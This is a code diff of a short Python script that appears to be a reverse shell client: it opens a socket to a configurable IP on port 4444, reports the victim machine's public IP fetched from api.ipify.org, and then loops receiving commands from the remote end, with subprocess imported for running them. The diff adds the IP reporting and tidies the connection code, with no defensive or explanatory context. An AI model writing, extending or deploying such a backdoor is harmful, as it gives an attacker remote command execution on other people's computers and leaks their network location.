@@ -1,16 +1,18 @@
 import os
 import socket
 import subprocess
+from requests import get
 
-IP = "[IP_PLACEHOLDER]"
+
+IP = ""
 PORT = 4444
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, PORT))
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
+    ip = get('https://api.ipify.org').text
+    s.send('[+] Public IP: {}'.format(ip).encode())
 
     while True:
         command = s.recv(1024).decode()
